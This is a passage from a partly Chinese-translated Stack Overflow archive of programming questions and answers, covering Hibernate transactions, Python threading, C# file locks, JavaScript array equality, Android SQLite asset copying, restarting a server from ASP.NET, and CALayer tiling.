2013-02-12 13:01:14 INFO  LocalContainerEntityManagerFactoryBean:441 - Closing JPA EntityManagerFactory for persistence unit 'ruleEditor.persistence' 
```

日志显示 testException=[null] 但我不知道为什么会这样。我什至尝试使用 JPARepository 提供的 saveAndFlush() 方法但是这样做我得到了错误`javax.persistence.TransactionRequiredException: no transaction is in progress` 所以如果有人知道我我做错了，可以为我指明正确的方向，我将非常感谢您的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T10:43:06.270

在仔细阅读日志后，我发现了这个警告：

```
WARN  Ejb3Configuration:1309 - HHH000193: Overriding hibernate.transaction.factory_class is dangerous, this might break the EJB3 specification implementation 
```

这与我在 tests-context.xml 文件中的 jpaPropertyMap bean 中设置的属性有关：

```
<entry key="hibernate.transaction.factory_class"  value="org.hibernate.transaction.JTATransactionFactory" /> 
```

事实证明，一旦我在配置文件中删除了这一行，我就可以看到 hibernate 执行“插入”操作，并且用户实际上是在数据库中创建的。由于我是 spring 和我使用的所有技术的新手，我一定是从某个地方复制了配置而没有真正分析它。因此，我现在可以在项目中使用 spring data、hibernate 和 bitronix 作为事务管理器来运行 junit4 测试。

# python - Problems with threading

> ID：14832591
> 
> 赞同：0
> 
> 时间：2013-02-12T12:28:44.473
> 
> 标签：python, deadlock, multithreading

I got some problem with two threads which do seem to deadlock

The idea is this:

```
p1 = threading.Thread(targest  =myClass.setData, args = mylist)
p1.start()
p2 = threading.Thread(target = myClass.takeData, args = mylist)
p2.start() 
```

mylist is a list.

Everything works absolutely fine when either the list is almost empty or when only either p1 or p2 is running. If both run, they seem to deadlock. I have tried to lock them - to no avail.

setData has an infinite while-loop which resets data in mylist, whereas takedata has an infinite whileloop which reads data from mylist.

Is it possible to do what I try to do?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-12T12:48:49.520

正如[Adrián López](https://stackoverflow.com/users/1959899/adrian-lopez) 所说，这是一个生产者-消费者问题。您必须使用信号量来锁定 和 使用的全局 `myClass.setData`数据`myClass.takeData`。在这里，您有一个功能示例来获取想法。

[http://smherwig.blogspot.com.es/2012/09/producer-consumer-model-with-python.html](http://smherwig.blogspot.com.es/2012/09/producer-consumer-model-with-python.html)

# c# - 在创建新图像之前删除现有图像

> ID：14832596
> 
> 赞同：0
> 
> 时间：2013-02-12T12:28:59.980
> 
> 标签：c#, asp.net, image, bitmap

嗨，我有以下功能：

```
 private void CreateRoomImage(string path)
{
    Directory.CreateDirectory(path);
    var file = "";

    foreach (PanelView panelView in pv)
    {
        var RoomImage = GetRaumImageName(panelView.Title);
        file = path + GetImageFile(RoomImage);

        if (File.Exists(file))
        {
            File.Delete(file);
        }

        using (var img = GetRaumImage(panelView.Title, panelView))
        {

            ImageWriter imgWriter = new ImageWriter(ImageFormat.Bmp);
            imgWriter.Save(img, file);

        }

    }

} 
```

我的问题是，每次我尝试删除现有文件时，我的程序都会抛出异常：

```
The process can not access the file because it is being used by another process 
```

这个问题有解决方案吗？如何删除现有图像？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-12T12:39:06.450

It seems like this could be a weird race condition where the file.exists hasn't released the resource and it is trying to delete prior to release. I would probably try something along these lines.

```
 try
    {
        File.Delete(file);
    }
    catch
    {
       //File does not exist or another error occurred.
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-12T12:45:47.033

我自己找到的。

在 PageLoad 我也使用“文件”。我忘了处理图像：

```
 foreach (PanelView panel in pv)
    {

        path = Request.PhysicalPath.Substring(0, Request.PhysicalPath.LastIndexOf('\\') + 1) + subPath + "\\" + GetRaumImageName(panel.Title);
        bitMap = new Bitmap(path + ".bmp");

        b0 = BmpToMonochromConverter.CopyToBpp(bitMap, 1);

       // bounce.updateInterface.UpdateProductImage(b0, panel.Panel.PRODUCT_ID, "", ref update_Handle);
        bitMap.Dispose();
    } 
```

无论如何感谢您的帮助！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-12T13:40:24.163

为什么首先要删除文件？如果它已经存在，你不能让它覆盖现有文件吗？

您可以做的另一件事是将线程暂停 400 毫秒，直到操作系统执行此操作并且文件被完全删除并且所有流都关闭。

# javascript - 检查数组的所有值是否相等

> ID：14832603
> 
> 赞同：272
> 
> 时间：2013-02-12T12:29:28.590
> 
> 标签：javascript, jquery

我需要找到所有值都相等的数组。最快的方法是什么？我应该遍历它并比较值吗？

```
['a', 'a', 'a', 'a'] // true
['a', 'a', 'b', 'a'] // false 
```

* * *

## 回答 #1

> 赞同：453
> 
> 时间：2016-02-23T04:34:07.280

```
const allEqual = arr => arr.every( v => v === arr[0] )
allEqual( [1,1,1,1] )  // true 
```

或单线：

```
[1,1,1,1].every( (val, i, arr) => val === arr[0] )   // true 
```

[Array.prototype.every](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/every "Array.prototype.every")（来自 MDN）：该`every()`方法测试数组中的所有元素是否通过提供的函数实现的测试。

* * *

## 回答 #2

> 赞同：111
> 
> 时间：2014-01-21T18:35:05.257

**编辑：**成为红色忍者：

```
!!array.reduce(function(a, b){ return (a === b) ? a : NaN; }); 
```

结果：

```
var array = ["a", "a", "a"] => result: "true"
var array = ["a", "b", "a"] => result: "false"
var array = ["false", ""] => result: "false"
var array = ["false", false] => result: "false"
var array = ["false", "false"] => result: "true"
var array = [NaN, NaN] => result: "false" 
```

* * *

警告：

```
var array = [] => result: TypeError thrown 
```

这是因为我们没有传递*initialValue*。因此，您不妨先检查一下`array.length`。

* * *

## 回答 #3

> 赞同：63
> 
> 时间：2013-02-12T12:33:00.847

这行得通。您可以使用原型在 Array 上创建一个方法。

```
if (Array.prototype.allValuesSame === undefined) {
  Array.prototype.allValuesSame = function() {
    for (let i = 1; i < this.length; i++) {
      if (this[i] !== this[0]) {
        return false;
      }
    }
    return true;
  }
} 
```

以这种方式调用它：

```
let a = ['a', 'a', 'a'];
let b = a.allValuesSame(); // true
a = ['a', 'b', 'a'];
b = a.allValuesSame();     // false 
```

* * *

## 回答 #4

> 赞同：53
> 
> 时间：2017-08-01T10:31:52.740

您可以将 Array 变成 Set。如果 Set 的大小等于 1，则 Array 的所有元素都相等。

```
function allEqual(arr) {
  return new Set(arr).size == 1;
}

allEqual(['a', 'a', 'a', 'a']); // true
allEqual(['a', 'a', 'b', 'a']); // false 
```

* * *

## 回答 #5

> 赞同：32
> 
> 时间：2013-02-12T12:39:49.633

在 JavaScript 1.6 中，您可以使用[`Array.every`](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Array/every)：

```
function AllTheSame(array) {
    var first = array[0];
    return array.every(function(element) {
        return element === first;
    });
} 
```

您可能需要进行一些完整性检查，例如当数组没有元素时。`NaN`（此外，当所有元素都是since时，这将不起作用`NaN !== NaN`，但这不应该是一个问题......对吗？）

* * *

## 回答 #6

> 赞同：16
> 
> 时间：2014-01-21T19:10:33.717

为了进行性能比较，我还做了一个基准测试：

```
function allAreEqual(array){
    if(!array.length) return true;
    // I also made sure it works with [false, false] array
    return array.reduce(function(a, b){return (a === b)?a:(!b);}) === array[0];
}
function same(a) {
    if (!a.length) return true;
    return !a.filter(function (e) {
        return e !== a[0];
    }).length;
}

function allTheSame(array) {
    var first = array[0];
    return array.every(function(element) {
        return element === first;
    });
}

function useSome(array){
    return !array.some(function(value, index, array){
        return value !== array[0];
    });
} 
```

结果：

```
allAreEqual x 47,565 ops/sec ±0.16% (100 runs sampled)
same x 42,529 ops/sec ±1.74% (92 runs sampled)
allTheSame x 66,437 ops/sec ±0.45% (102 runs sampled)
useSome x 70,102 ops/sec ±0.27% (100 runs sampled) 
```

因此，显然使用内置 array.some() 是采样中最快的方法。

* * *

## 回答 #7

> 赞同：10
> 
> 时间：2015-06-22T09:08:23.253

使用下划线/lodash 的最短答案

```
function elementsEqual(arr) {
    return !_.without(arr, arr[0]).length
} 
```

规格：

```
elementsEqual(null) // throws error
elementsEqual([]) // true
elementsEqual({}) // true
elementsEqual([1]) // true
elementsEqual([1,2]) // false
elementsEqual(NaN) // true 
```

*编辑：*

甚至更短，灵感来自汤姆的回答：

```
function elementsEqual2(arr) {
    return _.uniq(arr).length <= 1;
} 
```

规格：

```
elementsEqual2(null) // true (beware, it's different than above)
elementsEqual2([]) // true
elementsEqual2({}) // true
elementsEqual2([1]) // true
elementsEqual2([1,2]) // false
elementsEqual2(NaN) // true 
```

* * *

## 回答 #8

> 赞同：10
> 
> 时间：2015-07-30T12:00:51.493

如果您已经在使用[underscore.js](http://underscorejs.org)，那么这里有另一个选项`_.uniq`：

```
function allEqual(arr) {
    return _.uniq(arr).length === 1;
} 
```

`_.uniq`返回数组的无重复版本。如果所有值都相同，则长度将为 1。

如评论中所述，鉴于您可能希望返回一个空数组`true`，那么您还应该检查这种情况：

```
function allEqual(arr) {
    return arr.length === 0 || _.uniq(arr).length === 1;
} 
```

* * *

## 回答 #9

> 赞同：7
> 
> 时间：2020-09-08T06:05:44.453

every() 函数检查数组的所有元素

```
 const checkArr = a => a.every( val => val === a[0] )
    checkArr(['a','a','a'])  // true 
```

* * *

## 回答 #10

> 赞同：6
> 
> 时间：2014-09-29T08:52:03.817

更新新解决方案：检查索引

```
 let a = ['a', 'a', 'b', 'a'];
 let b = ['a', 'a', 'a', 'a'];
 let check = (list) => list.every(item => list.indexOf(item) === 0);
 check(a); // false;
 check(b); // true; 
```

用 ES6 更新：使用`list.every`是最快的方法：

```
 let a = ['a', 'a', 'b', 'a'];
 let check = (list) => list.every(item => item === list[0]); 
```

旧版：

```
 var listTrue = ['a', 'a', 'a', 'a'];
      var listFalse = ['a', 'a', 'a', 'ab'];

      function areWeTheSame(list) { 
         var sample = list[0];
         return (list.every((item) => item === sample));
      } 
```

* * *

## 回答 #11

> 赞同：6
> 
> 时间：2017-05-13T02:59:59.113

**是的，**您也可以使用下面的过滤器检查它，非常简单，检查每个值是否与第一个相同：

```
//ES6
function sameValues(arr) {
  return arr.filter((v,i,a)=>v===a[0]).length === arr.length;
} 
```

也可以使用数组上的每个方法来完成：

```
//ES6
function sameValues(arr) {
  return arr.every((v,i,a)=>v===a[0]);
} 
```

你可以检查你的数组，如下所示：

```
sameValues(['a', 'a', 'a', 'a']); // true
sameValues(['a', 'a', 'b', 'a']); // false 
```

或者，如果你经常重用它，你可以将它添加到 JavaScript 中的原生 Array 功能中：

```
//ES6
Array.prototype.sameValues = Array.prototype.sameValues || function(){
 this.every((v,i,a)=>v===a[0]);
} 
```

你可以检查你的数组，如下所示：

```
['a', 'a', 'a', 'a'].sameValues(); // true
['a', 'a', 'b', 'a'].sameValues(); // false 
```

* * *

## 回答 #12

> 赞同：5
> 
> 时间：2013-02-12T13:04:11.487

`Array.every`如果支持，您可以使用：

```
var equals = array.every(function(value, index, array){
    return value === array[0];
}); 
```

循环的替代方法可能类似于`sort`

```
var temp = array.slice(0).sort();
var equals = temp[0] === temp[temp.length - 1]; 
```

或者，如果这些项目就像问题一样，那么肮脏的东西就像：

```
var equals = array.join('').split(array[0]).join('').length === 0; 
```

也有效。

* * *

## 回答 #13

> 赞同：5
> 
> 时间：2015-12-29T10:07:43.780

[你可以使用Array.prototype.every](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/every)、[Object.is](https://developer.mozilla.org/tr/docs/Web/JavaScript/Reference/Global_Objects/Object/is)和 ES6 箭头函数让这个单线器做你想做的事情：

```
const all = arr => arr.every(x => Object.is(arr[0], x)); 
```

* * *

## 回答 #14

> 赞同：4
> 
> 时间：2014-09-29T07:13:56.010

我认为最简单的方法是创建一个循环来将每个值与下一个值进行比较。只要“链”中有中断，它就会返回假。如果第一个等于第二个，第二个等于第三个，以此类推，那么我们可以得出结论，数组的所有元素彼此相等。

给定一个数组 data[]，那么你可以使用：

```
for(x=0;x<data.length - 1;x++){
    if (data[x] != data[x+1]){
        isEqual = false;            
    }
}
alert("All elements are equal is " + isEqual); 
```

* * *

## 回答 #15

> 赞同：4
> 
> 时间：2019-10-22T14:35:17.060

现在您可以使用集合轻松地做到这一点。

```
let a= ['a', 'a', 'a', 'a']; // true
let b =['a', 'a', 'b', 'a'];// false

console.log(new Set(a).size === 1);
console.log(new Set(b).size === 1);
```

* * *

## 回答 #16

> 赞同：3
> 
> 时间：2015-02-09T23:27:24.617

```
arr.length && arr.reduce(function(a, b){return (a === b)?a:false;}) === arr[0]; 
```

* * *

## 回答 #17

> 赞同：2
> 
> 时间：2013-02-12T12:35:14.580

你可以使用这个：

```
function same(a) {
    if (!a.length) return true;
    return !a.filter(function (e) {
        return e !== a[0];
    }).length;
} 
```

该函数首先检查数组是否为空。如果是，它的值是相等的。否则它过滤数组并获取与第一个不同的所有元素。如果没有这样的值 => 数组只包含相等的元素，否则它不包含。

* * *

## 回答 #18

> 赞同：2
> 
> 时间：2017-09-05T05:14:17.987

这很简单。创建一个函数并传递一个参数。在该函数中，将第一个索引复制到一个新变量中。然后创建一个for循环并循环遍历数组。在循环内部创建一个 while 循环，其条件是检查新创建的变量是否等于循环中的所有元素。如果在 for 循环完成后它的相等返回 true，否则在 while 循环内返回 false。

```
function isUniform(arra){
    var k=arra[0];
    for (var i = 0; i < arra.length; i++) {
        while(k!==arra[i]){
            return false;
        }
    }
    return true;
} 
```

* * *

## 回答 #19

> 赞同：2
> 
> 时间：2019-05-16T18:30:25.873

接受的[答案](https://stackoverflow.com/a/35568895/4793643)效果很好，但我想补充一点。它对我来说不起作用，`===`因为我正在比较对象数组的数组，但是在我的应用程序中，我一直在使用我强烈推荐的[fast-deep-equal](https://github.com/epoberezkin/fast-deep-equal)包。这样，我的代码如下所示：

```
let areAllEqual = arrs.every((val, i, arr) => equal(val, arr[0]) ); 
```

我的数据如下所示：

```
[  
  [
    {
      "ID": 28,
      "AuthorID": 121,
      "VisitTypeID": 2
    },
    {
      "ID": 115,
      "AuthorID": 121,
      "VisitTypeID": 1
    },
    {
      "ID": 121,
      "AuthorID": 121,
      "VisitTypeID": 1
    }
  ],
  [
    {
      "ID": 121,
      "AuthorID": 121,
      "VisitTypeID": 1
    }
  ],
  [
    {
      "ID": 5,
      "AuthorID": 121,
      "VisitTypeID": 1
    },
    {
      "ID": 121,
      "AuthorID": 121,
      "VisitTypeID": 1
    }
  ]
] 
```

* * *

## 回答 #20

> 赞同：2
> 
> 时间：2020-03-21T00:13:22.670

您可以将数组转换为 Set 并检查其大小

在原始数组条目的情况下，`number`即`string`：

```
const isArrayWithEqualEntries = array => new Set(array).size === 1 
```

如果对象数组具有要测试等效性的某些字段，请说`id`：

```
const mapper = ({id}) => id
const isArrayWithEqualEntries = array => new Set(array.map(mapper)).size === 1 
```

* * *

## 回答 #21

> 赞同：2
> 
> 时间：2020-06-06T14:45:33.247

您可以使用 for 循环：

```
function isEqual(arr) {
  var first = arr[0];
  for (let i = 1; i < arr.length; i++) {
    if (first !== arr[i]) {
      return false;
    }
  }
  return true;
} 
```

* * *

## 回答 #22

> 赞同：1
> 
> 时间：2013-07-10T22:42:33.890

Underscore 的`_.isEqual(object, other)`功能似乎适用于数组。在检查是否相等时，数组中项目的顺序很重要。请参阅[http://underscorejs.org/#isEqual](http://underscorejs.org/#isEqual)。

* * *

## 回答 #23

> 赞同：1
> 
> 时间：2015-05-04T10:38:27.430

```
var listTrue = ['a', 'a', 'a', 'a'];
var listFalse = ['a', 'a', 'a', 'ab'];

function areWeTheSame(list) { 
    var sample = list[0];
    return !(list.some(function(item) {
        return !(item == sample);
    }));
} 
```

* * *

## 回答 #24

> 赞同：1
> 
> 时间：2018-04-04T12:04:38.117

```
function isUniform(array) {   
  for (var i=1; i< array.length; i++) {
    if (array[i] !== array[0]) { return false; }
  }

  for (var i=1; i< array.length; i++) {
    if (array[i] === array[0]) { return true; }
  }
} 
```

*   对于第一个循环；每当它检测到不均匀时，返回“false”
*   第一个循环运行，如果它返回假，我们有“假”
*   当它不返回 false 时，意味着会有 true，所以我们进行第二个循环。当然，我们将从第二个循环中获得“真”（因为第一个循环发现它不是假的）

* * *

## 回答 #25

> 赞同：0
> 
> 时间：2018-04-03T15:04:58.433

使用 ES6 箭头函数语法时的另一种有趣方式：

```
x = ['a', 'a', 'a', 'a']
!x.filter(e=>e!==x[0])[0]  // true

x = ['a', 'a', 'b', 'a']
!x.filter(e=>e!==x[0])[0] // false

x = []
!x.filter(e=>e!==x[0])[0]  // true 
```

当您不想为数组 (x) 重用变量时：

```
!['a', 'a', 'a', 'a'].filter((e,i,a)=>e!==a[0])[0]    // true 
```

IMO 以前使用 array.every(...) 的海报有最干净的解决方案。

* * *

## 回答 #26

> 赞同：0
> 
> 时间：2018-04-13T12:02:29.717

这可能有效，您也可以使用注释掉代码，它也适用于给定的场景。

```
function isUniform(){
	var arrayToMatch = [1,1,1,1,1];
	var temp = arrayToMatch[0];
	console.log(temp);
  /* return arrayToMatch.every(function(check){
    return check == temp;
   });*/
var bool;
   arrayToMatch.forEach(function(check){
    bool=(check == temp);
   })
  console.log(bool);
}
isUniform();
```

* * *

## 回答 #27

> 赞同：0
> 
> 时间：2019-05-16T18:58:54.267

1.  通过加入数组创建一个字符串。
2.  通过重复给定数组的第一个字符创建字符串
3.  匹配两个字符串

```
 function checkArray(array){
		return array.join("") == array[0].repeat(array.length);	
	}

	console.log('array: [a,a,a,a]: ' + checkArray(['a', 'a', 'a', 'a']));
	console.log('array: [a,a,b,a]: ' + checkArray(['a', 'a', 'b', 'a']));
```

你完成了！

* * *

## 回答 #28

> 赞同：0
> 
> 时间：2022-02-15T09:43:17.643

我喜欢的另一个很酷的解决方案是使用 XOR 运算符：

```
console.log([5,5,5,5].reduce((a,b)=>a^b) == 0)
>> true
console.log([5,5,5,4].reduce((a,b)=>a^b) == 0)
>> false 
```

* * *

## 回答 #29

> 赞同：-1
> 
> 时间：2016-07-29T13:27:32.430

简单的单行解决方案，只需将其与填充第一个条目的数组进行比较。

```
if(arr.join('') === Array(arr.length).fill(arr[0]).join('')) 
```

* * *

## 回答 #30

> 赞同：-1
> 
> 时间：2021-04-11T06:29:24.343

```
**// Logical Solution:- Declare global array and one variable(To check the condition) whether all element of an array contains same value or not.**

    var arr =[];
    var isMatching = false;

    for(var i=0;i<arr.length;i++){
            if(String(arr[i]).toLowerCase()== "Your string to check"){
                isMatching=true;
                // Array has same value in all index of an array
            }
            else{
                isMatching=false;
                // Array Doesn't has same value in all index of an array
                break;
            }
        }
    // **Check isMatching variable is true or false**

        if(isMatching){ // True
            //If Array has same value in all index, then this block will get executed
        }
        else{ //False
            //If Array doesn't has same value in all index, then this block will get executed
        } 
```

* * *

## 回答 #31

> 赞同：-1
> 
> 时间：2021-04-25T13:31:47.573

您可以计算数组中不同值的数量，如果该值为 1，则所有条目都相同。

例子：

```
array = np.array([1, 2, 2, 3, 3])
set(array) # this gives the different values present in the array (1,2,3)
len(set(array)) # this returns 3, 3 different values in the array 
```

* * *

## 回答 #32

> 赞同：-5
> 
> 时间：2016-07-24T12:33:44.453

在 PHP 中，有一个非常简单的解决方案，一行方法：

(计数(array_count_values($array)) == 1)

例如 ：

```
$arr1 = ['a', 'a', 'a', 'a'];
$arr2 = ['a', 'a', 'b', 'a'];

print (count(array_count_values($arr1)) == 1 ? "identical" : "not identical"); // identical
print (count(array_count_values($arr2)) == 1 ? "identical" : "not identical"); // not identical 
```

就这样。

# android - 将我的数据库文件从资产文件夹复制到我的应用程序时出错

> ID：14832613
> 
> 赞同：1
> 
> 时间：2013-02-12T12:30:08.043
> 
> 标签：android, database, sqlite

我有名称的数据库：MyDb.sqlite

然后在我的数据库文件中有 2 个表

**1 个用户表**

```
row1 id_users (primary key,auto increment,int)

row2 username (varchar)

and value is empty 
```

**2 表 android_metabata**

```
row1 locale (text) then values is en_US 
```

我将我的数据库放入资产文件夹

**JAVA类**

```
public class DataBaseHelper extends SQLiteOpenHelper{

    private static String DB_PATH = "/data/data/com.example/databases/";

    private static String DB_NAME = "MyDb.db";

    private SQLiteDatabase myDataBase; 

    private final Context myContext;

    private static DataBaseHelper sInstance = null;

    public DataBaseHelper(Context context) {

        super(context, DB_NAME, null, 1);
        this.myContext = context;
    }   

    public void createDataBase() throws IOException{

        boolean dbExist = checkDataBase();

        if(dbExist){
            //do nothing - database already exist
        }else{

            this.getReadableDatabase();

            try {

                copyDataBase();

            } catch (IOException e) {

                throw new Error("Error copying database");

            }
        }

    }

    private boolean checkDataBase(){

        SQLiteDatabase checkDB = null;

        try{
            String myPath = DB_PATH + DB_NAME;
            checkDB = SQLiteDatabase.openDatabase(myPath, null, SQLiteDatabase.OPEN_READONLY);

        }catch(SQLiteException e){

            //database does't exist yet.

        }

        if(checkDB != null){

            checkDB.close();

        }

        return checkDB != null ? true : false;
    }

    private void copyDataBase() throws IOException{

        //Open your local db as the input stream
        InputStream myInput = myContext.getAssets().open(DB_NAME);

        // Path to the just created empty db
        String outFileName = DB_PATH + DB_NAME;

        OutputStream myOutput = new FileOutputStream(outFileName);

        byte[] buffer = new byte[1024];
        int length;
        while ((length = myInput.read(buffer))>0){
            myOutput.write(buffer, 0, length);
        }

        //Close the streams
        myOutput.flush();
        myOutput.close();
        myInput.close();

    }

    public void openDataBase() throws SQLException{

        String myPath = DB_PATH + DB_NAME;
        myDataBase = SQLiteDatabase.openDatabase(myPath, null, SQLiteDatabase.OPEN_READONLY);

    }
    public Cursor select(String query) throws SQLException {
        return myDataBase.rawQuery(query, null);
    }

    public void insert(String table, ContentValues values) throws SQLException {
        myDataBase.insert(table, null, values);
    }

    public void delete(String table, String where) throws SQLException {

        myDataBase.delete(table, where, null);

    }

    public void update(String table, ContentValues values, String where) {

        myDataBase.update(table, values, where, null);

    }
    public void sqlCommand(String command) {
        myDataBase.execSQL(command);
    }

    @Override
    public synchronized void close() {

            if(myDataBase != null)
                myDataBase.close();

            super.close();

    }

    @Override
    public void onCreate(SQLiteDatabase db) {

    }

    @Override
    public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {

    }

    public static DataBaseHelper instance() {
        /*
        if (sInstance == null) {
            sInstance = new DataBaseManager();
        }
        */
        return sInstance;
    }

} 
```

进程复制成功然后我使用本[教程查看文件夹 data/data/my_package_name/databases](http://www.coderzheaven.com/2011/04/18/sqlitemanager-plugin-for-eclipse/)

但是我的表用户无法复制并且我的表 android_metadata 复制成功，为什么？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T10:54:43.920

试试这个代码：

```
public DataBaseHelper(Context context)
    {
        super(context, DB_NAME, null, 1);
        this.mContext = context;
        DB_PATH="/data/data/" + context.getPackageName() + "/databases/";
    }   

    public void openDataBase() throws SQLException
    {
        Log.e("Open", "open Database");
        mDbHelper = new DataBaseHelper(mContext);
        mDataBase = mDbHelper.getWritableDatabase();
    }
    @Override
    public synchronized SQLiteDatabase getWritableDatabase() 
  {
      SQLiteDatabase db = null;

        if (!existsDataBase()) {
            try 
            {
                copyDataBase ();
                db = super.getWritableDatabase();

            } catch(Exception ex) 
            {
                ex.printStackTrace();
                Log.e("Database Log", DB_PATH + " failed to copy correctly. " + ex.getLocalizedMessage());
            }
        }
        else {
            db = super.getWritableDatabase();
        }

        return db;

  }

private void copyDataBase() throws IOException {

        Log.e("copyDataBase", " called");
        // Open your local db as the input stream
        InputStream myInput = mContext.getAssets().open(DB_NAME);
        // Path to the just created empty db
        String outFileName = DB_PATH + DB_NAME;
        mDataBase=mContext.openOrCreateDatabase(DB_PATH+DB_NAME, Context.MODE_PRIVATE, null );
        // Open the empty db as the output stream
        OutputStream myOutput = new FileOutputStream(outFileName);
        // transfer bytes from the inputfile to the outputfile
        byte[] buffer = new byte[1024];
        int length;
        while ((length = myInput.read(buffer)) > 0) {
            myOutput.write(buffer, 0, length);
        }

        // Close the streams
        myOutput.flush();
        myOutput.close();
        myInput.close();
        //

    } 
```

// 像这样调用你的 DataBaseHelper 类： **mDatabase= new DataBaseHelper (this); mDatabase.openDataBase();** //它将复制现有数据库，如果您需要添加更多表，请在 openDatabase 方法中执行此操作

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-12T12:47:30.657

只需将此行放入您的代码中： **myContext.openOrCreateDatabase(DB_PATH+DB_NAME, Context.MODE_PRIVATE, null );**

您更新后的 copyDataBase() 方法变为：

```
private void copyDataBase() throws IOException{

    //Open your local db as the input stream
    InputStream myInput = myContext.getAssets().open(DB_NAME);

    // Path to the just created empty db
    String outFileName = DB_PATH + DB_NAME;

    myDataBase=myContext.openOrCreateDatabase(DB_PATH+DB_NAME, Context.MODE_PRIVATE, null );

    OutputStream myOutput = new FileOutputStream(outFileName);

    byte[] buffer = new byte[1024];
    int length;
    while ((length = myInput.read(buffer))>0){
        myOutput.write(buffer, 0, length);
    }

    //Close the streams
    myOutput.flush();
    myOutput.close();
    myInput.close();

} 
```

# c# - 从计算机上托管的 ASP.Net 页面重新启动计算机

> ID：14832615
> 
> 赞同：1
> 
> 时间：2013-02-12T12:30:11.617
> 
> 标签：c#, asp.net

我有一台计算机 A 托管不同类型的东西：

*   一个网站（使用`C#`and开发`ASP.Net`）
*   应用

我们的客户可以访问该网站，有时他们会想要重新启动计算机 A（知道它会在重新启动期间切断网站）。

我的问题很简单：它是否存在一种方式：

*   只需单击`ASP.Net`页面上的按钮即可重新启动计算机？我将如何做到这一点？
*   同样的方式，当点击页面上的按钮时是否可以执行一些批处理脚本（在计算机 A 上执行）`ASP.Net`？

谢谢你的帮助！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-12T12:32:54.533

这是足够安全的方法（只要密码安全存储）

```
ProcessStartInfo startInfo = new ProcessStartInfo("shutdown /r /f /t 5");
startInfo.UserName ="user with enough rights";
startInfo.Password ="password";
Process.Start(startInfo);

// /r - restart
// /f - force
// /t 5 - wait 5 seconds 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-12T12:34:19.383

您可以在命令行中从 C# 执行“shutdown -r”命令，请参阅[这个](https://stackoverflow.com/questions/1469764/run-command-prompt-commands)SO question 怎么做。请注意，应用程序必须得到很好的保护，并且在 IIS 下运行的应用程序必须具有足够的用户权限。

编辑：富士提出的方法效果很好，甚至不需要提升过程（我没想到它会起作用，哎呀；））

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-12T12:33:51.187

您可以使用 System. Diagnostics.Process 命名空间，完整流程请查看以下链接。

[http://www.c-sharpcorner.com/UploadFile/yuanwang200409/RemoteRestartWindows09252006141003PM/RemoteRestartWindows.aspx](http://www.c-sharpcorner.com/UploadFile/yuanwang200409/RemoteRestartWindows09252006141003PM/RemoteRestartWindows.aspx)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-02-12T12:34:15.903

这很容易实现，但问题是 IIS 是否允许它。您还将打开漏洞利用，因为如果有人设法利用此漏洞，他们可以链式重启您的服务器。

如果您真的想继续执行此操作，您可以简单地设置一个`Web Service`触发以下代码的调用。

```
System.Diagnostics.Process.Start("shutdown.exe", "-r -t 0"); 
```

虽然，这听起来更像是您正在寻找一种管理工具来处理这个问题。我建议您查看可用于帮助远程管理服务器的众多工具之一。对于安全来说，管理软件能够赋予用户特定的权限是很重要的，比如限制他们只能重新启动服务器。

# objective-c - 如何为 CALayer 设置平铺背景图像？

> ID：14832618
> 
> 赞同：0
> 
> 时间：2013-02-12T12:30:29.620
> 
> 标签：objective-c, cocoa

当我为 IKBrowserView 设置背景时，背景会根据视图大小调整大小：有没有办法将其设置为平铺图像，重复但从不调整大小？

```
NSImage*    backgroundImage = [NSImage imageNamed:@"wood-bg2.jpg"];
CALayer*    aLayer = [CALayer layer];
//aLayer.contents = backgroundImage;

CIColor *ci = [[CIColor alloc] initWithColor:[NSColor colorWithPatternImage:backgroundImage]];
CGColorSpaceRef cs = [ci colorSpace];
const CGFloat *comps = [ci components];
CGColorRef cgColor = CGColorCreate(cs, comps);

aLayer.backgroundColor = cgColor;
[itemThumbnailImageBrowserView setBackgroundLayer:aLayer]; 
```

我已经尝试了注释掉的代码和当前代码，但都没有工作。谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-12T12:35:19.367

有一种方法`NSColor`：

```
+ (NSColor *)colorWithPatternImage:(NSImage *)image 
```

所以你可以做这样的事情：

```
NSImage*    backgroundImage = [NSImage imageNamed:@"wood-bg2.jpg"];
CALayer*    aLayer = [CALayer layer];
aLayer.backgroundColor = [[NSColor colorWithPatternImage:backgroundImage] CGColor]; // - (CGColor) CGColor; is only available in OS X 10.8 and later
[itemThumbnailImageBrowserView setBackgroundLayer:aLayer]; 
```

* * *

# OS X 10.8 及更低版本的更新

**转换`NSColor`为`CGColor`（未测试）：**

```
CIColor *ci = [[CIColor alloc] initWithColor:[NSColor colorWithPatternImage:backgroundImage]];
CGColorSpaceRef cs = [ci colorSpace];
const CGFloat *comps = [ci components];
CGColorRef cgColor = CGColorCreate(cs, comps); 
```

# java - 两个jsp窗口之间的事件时间

> ID：14832619
> 
> 赞同：1
> 
> 时间：2013-02-12T12:30:29.263
> 
> 标签：java, javascript, jsp

这可能听起来很奇怪，但我有一个 jsp 表单，它在页面上有一个事件计时器，可以在用户注销之前保持页面处于活动状态。选择一些选项后，它会打开一个弹出窗口，用户必须在其中填写带有更多选项的表单。

问题是，当用户在第二个表单上处于活动状态时，第一个表单可能会超时，如果第二个表单上有激活，我想以某种方式重置第一个表单上的计时器。实际上，即使它失去焦点，也足以确定原始表单上的一般鼠标或键盘活动。

这可以做到吗？

我们正在使用一个名为 Nordic Edge 的专有框架，因此我没有太多空间来重建搜索和弹出窗口的实现方式。

# javascript - 到达页面底部时，粘性导航栏闪烁

> ID：14832621
> 
> 赞同：12
> 
> 时间：2013-02-12T12:30:37.310
> 
> 标签：javascript, html, css, twitter-bootstrap, nav

